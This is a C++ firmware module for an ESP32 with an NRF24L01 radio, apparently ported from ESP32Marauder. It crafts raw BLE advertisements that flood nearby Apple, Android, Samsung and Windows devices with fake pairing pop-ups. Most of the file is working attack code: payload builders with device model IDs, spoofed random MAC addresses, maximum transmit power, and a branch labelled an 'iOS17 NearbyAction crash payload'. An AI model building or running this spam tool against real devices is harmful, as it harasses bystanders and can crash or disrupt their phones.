// NRF BLE Spam module — BLE advertisement spam via NRF24L01
// Ported from ESP32Marauder/NrfBleSpam (MIT) / floe/BTLE technique.
// NRF24 is configured for 1 Mbps, CRC disabled, 4-byte address == BLE access
// address (0x6B7D9171).  BLE PDU + whitening + CRC are constructed in software.

#include "nrf_ble_spam.h"

#include <Arduino.h>
#include <SPI.h>
#include <freertos/FreeRTOS.h>
#include <freertos/semphr.h>
#include <freertos/task.h>

#include "../hal/pins.h"
#include "../hal/ble_log.h"
#include "../hal/nrf_radio.h"

NrfBleSpamModule g_nrfBleSpam;

namespace {

static const uint32_t BLE_ADDR    = 0x6B7D9171;
static const uint8_t  NRF_CH[3]   = {2, 26, 80};
static const uint8_t  BLE_CH[3]   = {37, 38, 39};
static constexpr int  SENDS_PER_CH = 3;

static inline int8_t fakeTxPower() { return (int8_t)(-60 + (int)(esp_random() % 66)); }

// ---- Google FastPair device model IDs (484 entries) --------------------------

static const uint8_t g_fastpair_models[][3] = {
  {0xDA,0xE0,0x96}, {0xA8,0x3C,0x10}, {0x00,0x20,0x00}, {0x9B,0x73,0x39}, {0x20,0x2B,0x3D}, {0x07,0x00,0x00}, {0x47,0x00,0x00}, {0x02,0xD8,0x15},
  {0x1E,0xE8,0x90}, {0xE6,0xE7,0x71}, {0xCA,0xB6,0xB8}, {0x9C,0x39,0x97}, {0x99,0x39,0xBC}, {0xD7,0x10,0x2F}, {0xCA,0x70,0x30}, {0x05,0xAA,0x91},
  {0x91,0xAA,0x05}, {0x03,0xAA,0x91}, {0x91,0xAA,0x03}, {0x02,0xAA,0x91}, {0x91,0xAA,0x02}, {0x03,0x8F,0x16}, {0x00,0xAA,0x91}, {0x91,0xAA,0x00},
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  {0x9C,0xA2,0x77}, {0xCC,0x75,0x4F}, {0x8C,0x17,0x06}, {0xE5,0xE2,0xE9}
};
static const uint16_t g_fastpair_count = sizeof(g_fastpair_models) / 3;

static const uint8_t fp_debug[][3] = {
  {0x08,0x00,0x00}, {0x09,0x00,0x00}, {0x0A,0x00,0x00}, {0x0A,0x00,0x7F},
  {0x0B,0x00,0x00}, {0x0C,0x00,0x00}, {0x35,0x00,0x00}, {0x47,0x00,0x00},
  {0x48,0x00,0x00}, {0x49,0x00,0x00},
};

static const uint8_t watch_models[] = {
  0x60,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,
  0x6A,0x6B,0x6C,0x6D,0x6E,0x6F,0x70,0x71,0x72,0x73,
  0x74,0x75,0x76,0x77,0x78,0x79
};

// ---- BLE packet helpers ------------------------------------------------------

static uint8_t swapbits(uint8_t a) {
    uint8_t v = 0;
    if (a & 0x80) v |= 0x01; if (a & 0x40) v |= 0x02;
    if (a & 0x20) v |= 0x04; if (a & 0x10) v |= 0x08;
    if (a & 0x08) v |= 0x10; if (a & 0x04) v |= 0x20;
    if (a & 0x02) v |= 0x40; if (a & 0x01) v |= 0x80;
    return v;
}

static void bleWhiten(uint8_t* buf, uint8_t len, uint8_t ble_chan) {
    uint8_t lfsr = ble_chan | 0x40;
    while (len--) {
        uint8_t res = 0;
        for (uint8_t i = 1; i; i <<= 1) {
            if (lfsr & 0x01) { lfsr ^= 0x88; res |= i; }
            lfsr >>= 1;
        }
        *(buf++) ^= res;
    }
}

static void bleCRC(uint8_t* buf, uint8_t len, uint8_t* dst) {
    dst[0] = 0xAA; dst[1] = 0xAA; dst[2] = 0xAA;
    while (len--) {
        uint8_t d = *(buf++);
        for (uint8_t i = 1; i; i <<= 1, d >>= 1) {
            uint8_t t = dst[0] & 0x01;
            dst[0] >>= 1; if (dst[1] & 0x01) dst[0] |= 0x80;
            dst[1] >>= 1; if (dst[2] & 0x01) dst[1] |= 0x80;
            dst[2] >>= 1;
            if (t != (d & 1)) { dst[2] ^= 0xDA; dst[1] ^= 0x60; }
        }
    }
}

// Transmit one advertisement on all three BLE advertising channels.
// Must be called while spi_mutex is held.
static void txAdvert(uint8_t* mac, uint8_t* addata, uint8_t adlen) {
    uint8_t pdu_len = 2 + 6 + adlen;
    uint8_t total   = pdu_len + 3;  // + 3 bytes CRC
    if (total > 32) return;

    uint8_t pdu[32] = {0};
    pdu[0] = 0x42;
    pdu[1] = 6 + adlen;
    memcpy(&pdu[2], mac, 6);
    memcpy(&pdu[8], addata, adlen);
    bleCRC(pdu, pdu_len, &pdu[pdu_len]);

    for (int ch = 0; ch < 3; ch++) {
        uint8_t out[32];
        memcpy(out, pdu, total);
        bleWhiten(out, total, BLE_CH[ch]);
        for (int i = 0; i < total; i++) out[i] = swapbits(out[i]);
        g_nrf_radio.setChannel(NRF_CH[ch]);
        delayMicroseconds(130);
        for (int r = 0; r < SENDS_PER_CH; r++) g_nrf_radio.write(out, total);
        delayMicroseconds(50);
    }
}

static void randMac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)(esp_random() & 0xFF);
    mac[5] |= 0xC0;  // set locally administered + multicast bits
}

// ---- Payload builders -------------------------------------------------------

static void spamApple() {
    uint8_t mac[6]; randMac(mac);
    if ((esp_random() % 10) < 7) {
        const uint8_t action_types[] = {
            0x13,0x27,0x20,0x19,0x1E,0x09,0x02,0x0B,0x01,0x06,0x0D,0x2B,0x05,0x24,0x2F,0x21
        };
        uint8_t act   = action_types[esp_random() % sizeof(action_types)];
        uint8_t aflag = 0xC0;
        if (act == 0x21) aflag = 0x40;
        else if (act == 0x20 && (esp_random() & 1)) aflag = 0xBF;
        else if (act == 0x09 && (esp_random() & 1)) aflag = 0x40;
        uint8_t ad[] = {
            0x0A, 0xFF, 0x4C, 0x00,
            0x0F, 0x05, aflag, act,
            (uint8_t)(esp_random() & 0xFF), (uint8_t)(esp_random() & 0xFF), (uint8_t)(esp_random() & 0xFF),
            0x02, 0x0A, (uint8_t)fakeTxPower()
        };
        txAdvert(mac, ad, sizeof(ad));
    } else {
        // iOS17 NearbyAction crash payload
        const uint8_t crash_actions[] = {
            0x13,0x27,0x20,0x19,0x1E,0x09,0x02,0x0B,0x01,0x06,0x0D,0x2B
        };
        uint8_t cact  = crash_actions[esp_random() % sizeof(crash_actions)];
        uint8_t cflag = (cact == 0x20) ? 0xBF : ((cact == 0x09 && (esp_random() & 1)) ? 0x40 : 0xC0);
        uint8_t ad[] = {
            0x10, 0xFF, 0x4C, 0x00,
            0x0F, 0x05, cflag, cact,
            (uint8_t)(esp_random()&0xFF),(uint8_t)(esp_random()&0xFF),(uint8_t)(esp_random()&0xFF),
            0x00, 0x00, 0x10,
            (uint8_t)(esp_random()&0xFF),(uint8_t)(esp_random()&0xFF),(uint8_t)(esp_random()&0xFF),
            0x02, 0x0A, (uint8_t)fakeTxPower()
        };
        txAdvert(mac, ad, sizeof(ad));
    }
}

static void spamGoogle() {
    uint8_t mac[6]; randMac(mac);
    uint8_t m0, m1, m2;
    if ((esp_random() % 10) < 6) {
        uint8_t di = esp_random() % (sizeof(fp_debug) / 3);
        m0 = fp_debug[di][0]; m1 = fp_debug[di][1]; m2 = fp_debug[di][2];
    } else {
        uint16_t fi = esp_random() % g_fastpair_count;
        m0 = g_fastpair_models[fi][0]; m1 = g_fastpair_models[fi][1]; m2 = g_fastpair_models[fi][2];
    }
    uint8_t ad[] = {
        3,    0x03, 0x2C, 0xFE,
        6,    0x16, 0x2C, 0xFE, m0, m1, m2,
        2,    0x0A, (uint8_t)fakeTxPower()
    };
    txAdvert(mac, ad, sizeof(ad));
}

static void spamSamsung() {
    uint8_t mac[6]; randMac(mac);
    uint8_t model = watch_models[esp_random() % sizeof(watch_models)];
    uint8_t ad[] = {
        14, 0xFF, 0x75, 0x00,
        0x01, 0x00, 0x02, 0x00,
        0x01, 0x01, 0xFF, 0x00,
        0x00, 0x43, model,
        0x02, 0x0A, (uint8_t)fakeTxPower()
    };
    txAdvert(mac, ad, sizeof(ad));
}

static void spamMicrosoft() {
    uint8_t mac[6]; randMac(mac);
    uint8_t nlen = 4 + (esp_random() % 4);
    char name[8];
    for (uint8_t i = 0; i < nlen; i++) name[i] = 'A' + (esp_random() % 26);
    uint8_t ad[18];
    uint8_t i = 0;
    ad[i++] = 6 + nlen; ad[i++] = 0xFF;
    ad[i++] = 0x06; ad[i++] = 0x00;
    ad[i++] = 0x03; ad[i++] = 0x00;
    ad[i++] = 0x80;
    memcpy(&ad[i], name, nlen); i += nlen;
    ad[i++] = 0x02; ad[i++] = 0x0A; ad[i++] = (uint8_t)fakeTxPower();
    txAdvert(mac, ad, i);
}

// ---- Task -------------------------------------------------------------------

void bleSpamTask(void* arg) {
    NrfBleSpamModule* self = reinterpret_cast<NrfBleSpamModule*>(arg);

    if (self->hasChip() && nrfLockSpi()) {
        g_nrf_radio.powerUp();
        g_nrf_radio.stopListening();
        nrfUnlockSpi();
    }

    BLOG("[nrf_ble_spam] task started\n");
    uint32_t count = 0;
    uint32_t lastReport = millis();
    uint8_t cursor = 0;

    while (self->isRunning()) {
        if (!self->hasChip()) {
            vTaskDelay(pdMS_TO_TICKS(100));
        } else if (nrfLockSpi(pdMS_TO_TICKS(20))) {
            // txAdvert() issues delayMicroseconds() internally; keep mutex for full call.
            switch (self->getType()) {
                case BleSpamType::APPLE:     spamApple();     break;
                case BleSpamType::GOOGLE:    spamGoogle();    break;
                case BleSpamType::SAMSUNG:   spamSamsung();   break;
                case BleSpamType::MICROSOFT: spamMicrosoft(); break;
                default:  // ALL: weighted round-robin
                    switch (cursor % 8) {
                        case 0: case 2: case 4: case 6: spamApple();     break;
                        case 1: case 5:                 spamGoogle();    break;
                        case 3:                         spamSamsung();   break;
                        case 7:                         spamMicrosoft(); break;
                    }
                    break;
            }
            cursor++;
            count++;
            nrfUnlockSpi();
        }

        if (millis() - lastReport >= 1000) {
            self->updateAdvsPerSec(count);
            BLOG("[nrf_ble_spam] adv/sec=%lu chip=%d\n", (unsigned long)count, (int)self->hasChip());
            count = 0;
            lastReport = millis();
        }
        vTaskDelay(1);
    }

    if (self->hasChip() && nrfLockSpi()) {
        g_nrf_radio.powerDown();
        nrfUnlockSpi();
    }
    BLOG("[nrf_ble_spam] task exiting\n");
    self->clearTask();
    vTaskDelete(nullptr);
}

}  // namespace

// ---- IModule ----------------------------------------------------------------

bool NrfBleSpamModule::init() {
    if (!nrfLockSpi(pdMS_TO_TICKS(200))) {
        BLOG("[nrf_ble_spam] init: spi_mutex timeout\n");
        available_ = false;
        return false;
    }
    pinMode(PIN_NRF_CE,  OUTPUT); digitalWrite(PIN_NRF_CE,  LOW);
    pinMode(PIN_NRF_CSN, OUTPUT); digitalWrite(PIN_NRF_CSN, HIGH);
    delay(10);

    SPI.begin(PIN_SPI_SCK, PIN_SPI_MISO, PIN_SPI_MOSI);

    // Raw STATUS read before RF24::begin() to diagnose SPI wiring.
    // 0x0E = chip OK  0xFF = MISO floating  0x00 = MOSI/SCK issue
    SPI.beginTransaction(SPISettings(1000000, MSBFIRST, SPI_MODE0));
    digitalWrite(PIN_NRF_CSN, LOW);
    uint8_t rawStatus = SPI.transfer(0xFF);
    digitalWrite(PIN_NRF_CSN, HIGH);
    SPI.endTransaction();

    bool begun = g_nrf_radio.begin();
    bool chip  = begun && g_nrf_radio.isChipConnected();

    if (begun) {
        g_nrf_radio.setAutoAck(false);
        g_nrf_radio.setDataRate(RF24_1MBPS);
        g_nrf_radio.disableCRC();
        g_nrf_radio.setAddressWidth(4);
        g_nrf_radio.openWritingPipe(BLE_ADDR);
        g_nrf_radio.setPALevel(RF24_PA_MAX);
        g_nrf_radio.setRetries(0, 0);
        g_nrf_radio.stopListening();
        g_nrf_radio.powerDown();
    }
    nrfUnlockSpi();

    available_ = true;
    detected_  = chip;
    BLOG("[nrf_ble_spam] init: begin=%d chip=%d spiSTATUS=0x%02X\n", begun, chip, rawStatus);
    return true;
}

bool NrfBleSpamModule::isAvailable() { return true; }

void NrfBleSpamModule::start() {
    if (running_.exchange(true)) return;
    if (task_ != nullptr) { running_ = false; return; }
    // Always re-init so the chip is in BLE mode regardless of prior module.
    init();
    BLOG("[nrf_ble_spam] start (chip=%s)\n", detected_ ? "YES" : "NO");
    xTaskCreatePinnedToCore(bleSpamTask, "nrf_ble_sp", 8192, this, 1, &task_, 0);
}

void NrfBleSpamModule::stop() {
    if (!running_) return;
    BLOG("[nrf_ble_spam] stop\n");
    running_ = false;
    for (int i = 0; i < 50 && task_; ++i) {
        vTaskDelay(pdMS_TO_TICKS(10));
        eTaskState st = eTaskGetState(task_);
        if (st == eDeleted || st == eInvalid) break;
    }
    task_ = nullptr;
}

void NrfBleSpamModule::fillStats(char* buf, size_t len) {
    snprintf(buf, len, "%lu/s", (unsigned long)adv_per_sec_.load());
}
